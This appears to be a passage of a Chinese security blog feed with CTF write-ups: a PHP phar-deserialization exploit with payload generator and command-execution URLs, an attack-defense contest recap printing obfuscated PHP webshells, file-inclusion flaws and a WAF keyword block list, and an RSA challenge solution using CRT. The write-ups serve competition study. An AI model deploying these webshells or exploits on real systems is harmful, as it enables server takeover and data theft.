alt="img"></p><p>所以本题的思路是先生成一个meta-data中包含恶意object的phar文件，然后通过上传点上传该文件得到路径，再在 <code>file_aq12ws.php</code> 通过filename参数以<code>phar://</code> 方式包含该文件，就将在file_exists函数处触发phar文件的meta-data的反序列化，就可以得到一个web shell。</p><p>要生成phar文件，需要 phar.readonly 为Off，即值为0。而出于安全性考虑，该项默认使能，值为1。当php.ini文件中的phar.readonly值为0时，可以使用ini_set在脚本中设为1或0；当值为1时，只能通过修改php.ini文件来修改值而不能通过脚本修改。也就是说，我们需要在生成phar文件前修改php.ini中phar.readonly值的Off。详细说明见 <a href="http://php.net/manual/en/phar.configuration.php#ini.phar.readonly" target="_blank" rel="noopener">文档</a> 。</p><p>生成phar包的代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'@eval($_GET["cmd"]);'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    $evil_object=<span class="keyword">new</span> MyClass();<span class="comment">//生成恶意对象</span></span><br><span class="line"></span><br><span class="line">    $file_name=<span class="string">"test.phar"</span>;<span class="comment">//后缀必须为phar</span></span><br><span class="line">    <span class="keyword">if</span>(file_exists($file_name))unlink(<span class="string">'test.phar'</span>);<span class="comment">//删除当前目录下已有的phar包</span></span><br><span class="line">    $phar=<span class="keyword">new</span> Phar($file_name);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);<span class="comment">//设置stub，可理解为phar文件的标志</span></span><br><span class="line">    $phar-&gt;setMetadata($evil_object);<span class="comment">//将恶意对象作为自定义的meta-data传入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"foo.txt"</span>,<span class="string">"bar"</span>);<span class="comment">//添加压缩文件及其内容</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>访问该代码后目录下会生成<code>test.phar</code> 文件，重命名为<code>test.gif</code> ，上传后访问 <code>target.ip/file_aq12ws.php?filename=phar://test.gif&amp;cmd=phpinfo();</code> 见到phpinfo页面就说明成功了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ xxd test.phar</span><br><span class="line">00000000: 3c3f 7068 7020 5f5f 4841 4c54 5f43 4f4d  &lt;?php __HALT_COM</span><br><span class="line">00000010: 5049 4c45 5228 293b 203f 3e0d 0a70 0000  PILER(); ?&gt;..p..</span><br><span class="line">00000020: 0001 0000 0011 0000 0001 0000 0000 003b  ...............;</span><br><span class="line">00000030: 0000 004f 3a37 3a22 4d79 436c 6173 7322  ...O:7:<span class="string">"MyClass"</span></span><br><span class="line">00000040: 3a31 3a7b 733a 363a 226f 7574 7075 7422  :1:&#123;s:6:<span class="string">"output"</span></span><br><span class="line">00000050: 3b73 3a32 303a 2240 6576 616c 2824 5f47  ;s:20:<span class="string">"@eval(<span class="variable">$_G</span></span></span><br><span class="line"><span class="string">00000060: 4554 5b22 636d 6422 5d29 3b22 3b7d 0700  ET["</span>cmd<span class="string">"]);"</span>;&#125;..</span><br><span class="line">00000070: 0000 666f 6f2e 7478 7403 0000 000a 5ffb  ..foo.txt....._.</span><br><span class="line">00000080: 5b03 0000 00aa 8cff 76b6 0100 0000 0000  [.......v.......</span><br><span class="line">00000090: 0062 6172 7533 2162 c819 a6d5 6019 ab22  .baru3!b....`..<span class="string">"</span></span><br><span class="line"><span class="string">000000a0: 7e2e f1df 96d7 b375 0200 0000 4742 4d42  ~......u....GBMB</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//172.16.17.2/file_aq12ws.php?filename=phar://upload_file/phphphar2.gif&amp;a=system('find / | grep flag');</span></span><br><span class="line">http:<span class="comment">//172.16.17.2/file_aq12ws.php?filename=phar://upload_file/phphphar2.gif&amp;a=system('cat /var/www/html/sdf3r_df3erdf/flag.txt');</span></span><br><span class="line">flag&#123;qwe3_89fdsf3_jjnj3ioxc_ozxov&#125;</span><br></pre></td></tr></table></figure><h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><p><strong>attack</strong> </p><p>一上来D盾扫出几个后门。用其中一个连了菜刀，在<code>E:\wwwroot\RequestFlag\</code> 发现<code>url.bat</code> ，内容为：<code>curl.exe https://FlagServer.com:9000/flag --cacert ca.crt --cert client.crt --key client.key</code> ，在目标机上执行该命令可以得到对方flag。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">"http://172.16.18.13/wordpress/wp-includes/customize/class-wp-customize-background-image-list.php"</span> -d <span class="string">"-7=system('E:\wwwroot\RequestFlag\curl.exe https://FlagServer.com:9000/flag --cacert E:\wwwroot\RequestFlag\ca.crt --cert E:\wwwroot\RequestFlag\client.crt --key E:\wwwroot\RequestFlag\client.key');"</span></span><br></pre></td></tr></table></figure><p>用的木马是<code>wwwroot\wordpress\wp-includes\customize\class-wp-customize-background-image-list.php</code>  ，相当于<code>@assert(${_POST}[-7]);</code> 。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_ = <span class="string">"s"</span> . <span class="string">"s"</span> . <span class="comment">/*-/*-*/</span><span class="string">"e"</span> . <span class="comment">/*-/*-*/</span><span class="string">"r"</span>;</span><br><span class="line">@$_ = <span class="comment">/*-/*-*/</span><span class="string">"a"</span> . <span class="comment">/*-/*-*/</span>$_ . <span class="comment">/*-/*-*/</span><span class="string">"t"</span>;</span><br><span class="line">@$_<span class="comment">/*-/*-*/</span>($<span class="comment">/*-/*-*/</span>&#123;<span class="string">"_P"</span> . <span class="comment">/*-/*-*/</span><span class="string">"OS"</span> . <span class="comment">/*-/*-*/</span><span class="string">"T"</span>&#125;</span><br><span class="line">[<span class="comment">/*-/*-*/</span><span class="number">0</span><span class="comment">/*-/*-*/</span> - <span class="comment">/*-/*-*/</span><span class="number">2</span><span class="comment">/*-/*-*/</span> - <span class="comment">/*-/*-*/</span><span class="number">5</span><span class="comment">/*-/*-*/</span>]);</span><br></pre></td></tr></table></figure><p>在WAF上配了一些敏感字符正则后观察日志，发现另一个大家用的比较多的后门，<code>wwwroot\wordpress\wp-includes\pomo\tp.php</code> ，等价于<code>@ASsERT(eval(@$_POST[cmd]));</code> 。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$&#123;(<span class="string">"#"</span> ^ <span class="string">"|"</span>) . (<span class="string">"#"</span> ^ <span class="string">"|"</span>)&#125; = (<span class="string">"!"</span> ^ <span class="string">"`"</span>) . (<span class="string">"( "</span> ^ <span class="string">"&#123;"</span>) . (<span class="string">"("</span> ^ <span class="string">"["</span>) . (<span class="string">"~"</span> ^ <span class="string">";"</span>) . (<span class="string">"|"</span> ^ <span class="string">"."</span>) . (<span class="string">"*"</span> ^ <span class="string">"~"</span>);</span><br><span class="line">@$&#123;(<span class="string">"#"</span> ^ <span class="string">"|"</span>) . (<span class="string">"#"</span> ^ <span class="string">"|"</span>)&#125;((<span class="string">"-"</span> ^ <span class="string">"H"</span>) . (<span class="string">"]"</span> ^ <span class="string">"+"</span>) . (<span class="string">"["</span> ^ <span class="string">":"</span>) . (<span class="string">","</span> ^ <span class="string">"@"</span>) . (<span class="string">"&#125;"</span> ^ <span class="string">"U"</span>) . (<span class="string">"~"</span> ^ <span class="string">"&gt;"</span>) . (<span class="string">"e"</span> ^ <span class="string">"A"</span>) . (<span class="string">"("</span> ^ <span class="string">"w"</span>) . (<span class="string">"j"</span> ^ <span class="string">":"</span>) . (<span class="string">"i"</span> ^ <span class="string">"&amp;"</span>) . (<span class="string">"#"</span> ^ <span class="string">"p"</span>) . (<span class="string">"&gt;"</span> ^ <span class="string">"j"</span>) . (<span class="string">"!"</span> ^ <span class="string">"z"</span>) . (<span class="string">"]"</span> ^ <span class="string">"&gt;"</span>) . (<span class="string">"@"</span> ^ <span class="string">"-"</span>) . (<span class="string">"["</span> ^ <span class="string">"?"</span>) . (<span class="string">"?"</span> ^ <span class="string">"b"</span>) . (<span class="string">"]"</span> ^ <span class="string">"t"</span>));</span><br></pre></td></tr></table></figure><p>后来发现两处文件包含。可以利用<code>./</code> 和<code>../</code> 分隔关键字绕过WAF，因为醒悟的比较晚和自动化做得不够方便，这个没有发挥太大作用。</p><p><code>wwwroot\wordpress\wp-content\plugins\localize-my-post\ajax\include.php</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Include WP base to have the basic WP functions</span></span><br><span class="line"><span class="keyword">include_once</span>($_SERVER[<span class="string">'DOCUMENT_ROOT'</span>] . <span class="string">"/wp-blog-header.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Set status 200 header</span></span><br><span class="line"><span class="comment">//Include requested file if it exists</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'file'</span>]))&#123;</span><br><span class="line">$file=$_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">$file = str_replace(<span class="string">'./'</span>,<span class="string">''</span>,$file);</span><br><span class="line">header(<span class="string">'HTTP/1.1 200 OK'</span>);</span><br><span class="line"><span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和 <code>wwwroot\wordpress\wp-content\plugins\site-editor\editor\extensions\pagebuilder\includes\ajax_shortcode_pattern.php</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[<span class="string">'ajax_path'</span>] ) )&#123;</span><br><span class="line">$ajax_path=$_REQUEST[<span class="string">'ajax_path'</span>];</span><br><span class="line">$ajax_path = str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$ajax_path);</span><br><span class="line">    <span class="keyword">require_once</span> $ajax_path;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>此外，有些队伍过滤了system，exe等关键字，采用反引号，base64编码，rot13编码等尝试绕过。</p><p>也许因为check机制不好使，某个时间开始大约一半以上的队伍选择关站保平安，即使只是访问对方主页也会被WAF拦截。这不难实现，只要在WAF里面把IP当关键字过滤掉就可以。这大概不太厚道吧，但黑客嘛，也许就是理解并打击规则？</p><p>没挖出啥洞，我好菜啊。而且WAF这么强，挖出来也用不上吧。</p><p><strong>defense</strong> </p><p>一开始就在WAF上把D盾扫出来的几个可疑文件加入黑名单，后来又配了敏感关键字<code>exec|system|exe|curl|flag|base64|filter|cmd|-7|{|rot13</code> 等，所以Web基本只在刚开始的几轮失分。</p><p>全程就是每轮打一下，看看WAF有没拦到有趣的东西，挣扎着试图挖到洞，以及尝试一些绕过关键字的方法。</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p><strong>attack</strong> </p><p>因为Web手比较菜:(，PWN手帮忙看了半天Web，开始搞PWN的时间比较晚，心态有点崩，最后思路来得晚，全程没打出分，很可惜。也许后面研究下王博的WP再复现一下。</p><p><strong>defense</strong> </p><p>权限问题动不了PWN文件，patch无门，基本坐着挨打。同样可能因为check机制的问题，存在一个fork炸弹躺下装死的防御思路。</p><h1 id="挨打要立正"><a href="#挨打要立正" class="headerlink" title="挨打要立正"></a>挨打要立正</h1><p>拿到两个第二确实是赛前没想到的，但这改变不了我菜的本质。队友们虽然比我强，但是也依然有很大进步空间，包括更扎实的基础，更熟练的操作，更灵活的思路，更默契的配合等等。</p><p>第一天突围赛刚开始比较顺利，最后五分钟被夜影师傅所在队伍反超，放上他们的逆向writeup：<a href="https://blog.csdn.net/whklhhhh/article/details/84454534" target="_blank" rel="noopener">181124 逆向-2018“柏鹭杯”厦大邀请赛初赛（Re1、2）</a> ，以弥补本文不足。</p><p>第二天AWD则全程被北航吊打，伏地膜。</p><p><del>因为看到某群里有人吐槽这是垃圾比赛，我觉得这个说法不太负责任，所以作为厦大学生多说两句。从题目来说。crypto一题有点脑洞，一题简单，一题中等，可以接受，misc也是相对合格的，Web题思路清晰，也有有趣的东西。reverse，PWN中也不乏质量不错的题，做出题的师傅也是认可其有自己特点的。</del></p><p><del>除了题目，比赛奖金也是很高的，闭幕式到场的嘉宾也是够级别的，比赛环境可以说相当不错，住宿交通也很人性化。从各个角度来说，这都可以算是一场有诚意的，有愿望办好且确实做得不错的比赛。所以不管是因为没被邀请、做不出题、确实感觉题目质量不行、现场厕所不够用、志愿者里面漂亮小姐姐不够多还是其他什么原因而觉得不爽的，吐槽时把话说清楚还是比较好的，免得引起不必要的误解。明年应该还会举办，欢迎路过的大佬来玩。</del></p><p><del>当然，要改进的东西还是蛮多的，反思不应该由我来做，简单说点自己的感受。最不理想的大概是AWD的check，这个称为健康检查的东西好像分不清怎样是健康。其次是使用WAF作为Web防守的工具固然可以让即使是像我这样的AWD经验不足的选手都可以很舒服，也减轻维护压力，但这样是没法打出刺激的AWD的，再加上check和我一样菜，除了没搞清楚状况的选手，有坚定原则的选手，很可能出现全场全线WAF，那就没啥好打的了。最后是PWN没有给选手patch的权限，这是不太正常的，直接导致最好的防护是把自己搞down，不管主办方是出于维护难度考虑还是什么，对真正有能力且想打一场有意思的比赛的选手来说游戏体验是不太好的。所以如果揪住这几点发表比较严厉的批评的话我是没话说的😔</del></p><p>最后，感谢队友带飞。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>如果RSA加密中的e和phi不互质</title>
      <link href="/181124-what-if-e-phi-not-coprime/"/>
      <url>/181124-what-if-e-phi-not-coprime/</url>
      
        <content type="html"><![CDATA[<p>这是和别人家的学弟交流的一道题，据称是2018高校网络信息安全管理运维挑战赛的RSA题目，可以帮助理解在RSA加密（姑且还这样称呼它吧）中当加密指数e和欧拉函数phi不互质的时候意味着什么，以及可能的解决方案。</p><p>如果没有理解错误的话，不互质并不会导致加密不安全，只是无法解密了，而且明文和密文在模数范围内也不再是一一对应。</p><p>此时如果有多个加密过程，他们的明文m和加密指数e相等，n不相等，那么只要能够构建一定数量的同余式，就可以用中国剩余定理求解，类似于广播攻击。</p><p>另一种思路就是本题的情况。多个同余式中的若干个n是可分解的，那么排列组合他们的p，q，以使得某种组合的phi能够和e互质，然后可以把模数降到这种组合的n值，就可以解出明文了。当然，这题的情况大概不是常有的。</p><p>题目内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">n1=<span class="number">0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723L</span></span><br><span class="line">e1=<span class="number">0xfae3aL</span></span><br><span class="line">c1=<span class="number">0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbeaL</span></span><br><span class="line">n2=<span class="number">0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63L</span></span><br><span class="line">e2=<span class="number">0x1f9eaeL</span></span><br><span class="line">c2=<span class="number">0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347L</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> pow(flag,e1,n1)==c1</span><br><span class="line"><span class="keyword">assert</span> pow(flag,e2,n2)==c2</span><br><span class="line"><span class="keyword">assert</span> gcd(e1,(p1<span class="number">-1</span>)*(q1<span class="number">-1</span>))==<span class="number">14</span></span><br><span class="line"><span class="keyword">assert</span> gcd(e2,(p2<span class="number">-1</span>)*(q2<span class="number">-1</span>))==<span class="number">14</span></span><br></pre></td></tr></table></figure><p>解答代码如下，为了给学弟看，做了具体的注释。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding : utf-8 -*-</span></span><br><span class="line"><span class="comment"># python 3.7</span></span><br><span class="line"><span class="comment"># __author__ = 'https://github.com/findneo'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factordb</span><span class="params">(n)</span>:</span></span><br><span class="line">    api=<span class="string">"http://factordb.com/api.php"</span></span><br><span class="line">    r=requests.get(api,params=&#123;<span class="string">'query'</span>:n&#125;)</span><br><span class="line">    res=json.loads(r.content)</span><br><span class="line">    <span class="keyword">if</span> res[<span class="string">'status'</span>] == <span class="string">"FF"</span>:</span><br><span class="line">        p,q=res[<span class="string">'factors'</span>][<span class="number">0</span>][<span class="number">0</span>],res[<span class="string">'factors'</span>][<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">        [p,q]=map(int,[p,q])</span><br><span class="line">        <span class="comment"># print('\n'.join([hex(p),hex(q)]))</span></span><br><span class="line">        <span class="keyword">return</span> p,q</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"not fully factored!"</span>)</span><br><span class="line"></span><br><span class="line">n1=<span class="number">0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723</span></span><br><span class="line">e1=<span class="number">0xfae3a</span></span><br><span class="line">c1=<span class="number">0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbea</span></span><br><span class="line">p1,q1=factordb(n1)</span><br><span class="line"><span class="comment"># p1=0xe5d7acdf77ca09e4391f21cea16c01cd2302d1a1df3983d413e9ee91fce8d9184ec0d0ca1608dbed748ed905a2beddc00168a1245f27f67e1240073c3d097965</span></span><br><span class="line"><span class="comment"># q1=0xe76aed4830504369c7c12070490f18900b80da1035ef82991dd35c52fd51731025c4498e8998bd026b9898963b6b69ded47b1dd96c264eac9d875756fd1b29e7</span></span><br><span class="line"></span><br><span class="line">n2=<span class="number">0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63</span></span><br><span class="line">e2=<span class="number">0x1f9eae</span></span><br><span class="line">c2=<span class="number">0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347</span></span><br><span class="line">p2,q2=factordb(n2)[::<span class="number">-1</span>]</span><br><span class="line"><span class="comment"># p2=0xeae0dfb99949af5175c425e22ec3c2e5b73cec0b70510dcc0ccd368ca6e868146c8783fa4aee0548fc725a3c3b0e46e44ec60357d3e6f4a5207e8a8ddf9c1225</span></span><br><span class="line"><span class="comment"># q2=0xe76aed4830504369c7c12070490f18900b80da1035ef82991dd35c52fd51731025c4498e8998bd026b9898963b6b69ded47b1dd96c264eac9d875756fd1b29e7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(q1==q2)</span><br><span class="line">q=q1</span><br><span class="line"><span class="comment"># n1,n2均可分解，且有一个公因数</span></span><br><span class="line"><span class="comment"># 由于gcd(e,phi)==14，将 (flag**e)%n = c 看作 (((flag**14)%n) ** (e//14) ) % n == c</span></span><br><span class="line"><span class="comment"># 分别记 e//14为e1,e2 , (flag**14)%n1 为 f1 , (flag**14)%n2 为 f2,则 pow(f1,e1,n1)==c1,pow(f2,e2,n2)==c2 且 gcd(e1,phi1)==gcd(e2,phi2)==1。可求得 f1,f2</span></span><br><span class="line">e1=e1//<span class="number">14</span>;e2=e2//<span class="number">14</span></span><br><span class="line">phi1=(p1<span class="number">-1</span>)*(q1<span class="number">-1</span>);phi2=(p2<span class="number">-1</span>)*(q2<span class="number">-1</span>)</span><br><span class="line">d1=gmpy2.invert(e1,phi1);d2=gmpy2.invert(e2,phi2)</span><br><span class="line">f1=pow(c1,d1,n1);f2=pow(c2,d2,n2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 记 flag**14 为 f3,则有同余方程组 f3 % n1 == f1; f3 % n2 == f2。其中f1,f2,n1,n2已知，可求模lcm(n1,n2)意义下的解 f3。</span></span><br><span class="line"><span class="comment"># 参考 https://findneo.github.io/180727rsa-attack/#%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86。</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,ai分别表示模数和取模后的值,都为列表结构</span></span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#不成立则不存在解</span></span><br><span class="line">        K = c // d * gmpy2.invert(curm // d, m // d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m // d</span><br><span class="line">        cura %= curm</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) <span class="comment">#(解,最小公倍数)</span></span><br><span class="line">f3,lcm = GCRT([n1,n2],[f1,f2])</span><br><span class="line"><span class="keyword">assert</span>(f3%n1==f1);<span class="keyword">assert</span>(f3%n2==f2);<span class="keyword">assert</span>(lcm==p1*p2*q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># assert(flag**14 % lcm == f3)</span></span><br><span class="line"><span class="comment"># 此时求出的 f3 满足上式。其中 lcm==p1*p2*q 有5个约数: 1, p1*q即n1 ,p2*q即n2, p1*p2记作n3, lcm。</span></span><br><span class="line"><span class="comment"># 上式可看作 pow(flag**2,7,lcm)==f3，等价于 pow(flag**2,7,n1)==f3%n1,pow(flag**2,7,n2)==f3%n2,pow(flag**2,7,n3)==f3%n3</span></span><br><span class="line"><span class="comment"># 由于 gcd(7,n1)==7,gcd(7,n2)==7。所以尝试选取 pow(flag**2,7,n3)==f3%n3 计算 flag**2 的值</span></span><br><span class="line">n3=p1*p2</span><br><span class="line">c3=f3%n3</span><br><span class="line">phi3=(p1<span class="number">-1</span>)*(p2<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">assert</span>(gmpy2.gcd(<span class="number">7</span>,phi3)==<span class="number">1</span>)</span><br><span class="line">d3=gmpy2.invert(<span class="number">7</span>,phi3)</span><br><span class="line">m3=pow(c3,d3,n3)</span><br><span class="line"><span class="keyword">if</span> gmpy2.iroot(m3,<span class="number">2</span>)[<span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">    flag=gmpy2.iroot(m3,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    print(binascii.unhexlify(hex(flag)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b'EIS&#123;Comm0n_Div15or_plus_CRT_is_so_easy|cb2733b9e69ab3a9bd526fa1&#125;'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>one-line-php-challenge 复现</title>
      <link href="/181123-one-line-php-challenge/"/>
      <url>/181123-one-line-php-challenge/</url>
      
